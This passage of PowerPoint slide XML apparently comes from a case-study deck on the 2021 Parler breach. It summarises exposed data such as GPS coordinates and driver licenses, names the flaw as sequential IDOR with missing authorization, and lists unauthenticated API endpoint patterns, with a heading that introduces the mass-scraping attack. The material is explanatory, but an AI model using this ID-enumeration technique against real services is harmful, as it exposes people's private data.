                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Total Data Scraped</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="2762845"/>
            <a:ext cx="4375547" cy="153233"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete platform archive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5127307" y="1997512"/>
            <a:ext cx="4375666" cy="408861"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>99.9%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437352" y="2519005"/>
            <a:ext cx="1755458" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Platform Compromised</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5127307" y="2762845"/>
            <a:ext cx="4375666" cy="153233"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Nearly all user content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9587508" y="1997512"/>
            <a:ext cx="4375547" cy="408861"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10M</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10962084" y="2519005"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Posts Exposed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9587508" y="2762845"/>
            <a:ext cx="4375547" cy="153233"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Including deleted content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="2992160"/>
            <a:ext cx="3273266" cy="813197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="798671" y="3123605"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Company</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="798671" y="3367445"/>
            <a:ext cx="3010376" cy="153233"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parler (Social Media Platform)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4008120" y="2992160"/>
            <a:ext cx="3273266" cy="813197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139565" y="3123605"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139565" y="3367445"/>
            <a:ext cx="3010376" cy="153233"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>January 2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7349014" y="2992160"/>
            <a:ext cx="3273266" cy="813197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7480459" y="3123605"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7480459" y="3367445"/>
            <a:ext cx="3010376" cy="153233"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sequential IDOR + Missing Authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10689908" y="2992160"/>
            <a:ext cx="3273266" cy="813197"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10821353" y="3123605"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Data Exposed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10821353" y="3367445"/>
            <a:ext cx="3010376" cy="306467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Posts, videos, GPS coordinates, driver licenses, EXIF metadata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="3906798"/>
            <a:ext cx="5524857" cy="325279"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Vulnerability: Completely Unsecured APIs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="4333518"/>
            <a:ext cx="13295948" cy="306467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parler's API endpoints required absolutely no authentication, allowing anyone to access any resource by simply incrementing sequential IDs. This fundamental security failure exposed the entire platform to trivial mass data extraction.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="4716066"/>
            <a:ext cx="13295948" cy="2790706"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1865"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="661035" y="4716066"/>
            <a:ext cx="13308330" cy="2790706"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="784860" y="4808934"/>
            <a:ext cx="13060680" cy="2604968"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 Parler's API - COMPLETELY UNSECURED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Get any post</a:t>
            </a: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GET /api/v1/post/{postId}</a:t>
            </a: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 NO AUTHENTICATION REQUIRED!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Get any user</a:t>
            </a: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GET /api/v1/user/{userId}</a:t>
            </a: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 NO AUTHENTICATION REQUIRED!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Get any video</a:t>
            </a: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GET /api/v1/video/{videoId}</a:t>
            </a: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 NO AUTHENTICATION REQUIRED!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Get any image</a:t>
            </a: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GET /api/v1/image/{imageId}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>// NO AUTHENTICATION REQUIRED!</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96835" y="311825"/>
            <a:ext cx="3356967" cy="241816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Attack: Mass Automated Scraping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1959769" y="616387"/>
            <a:ext cx="5805011" cy="3482935"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9515118" y="2240637"/>
            <a:ext cx="4725948" cy="234315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="600"/>
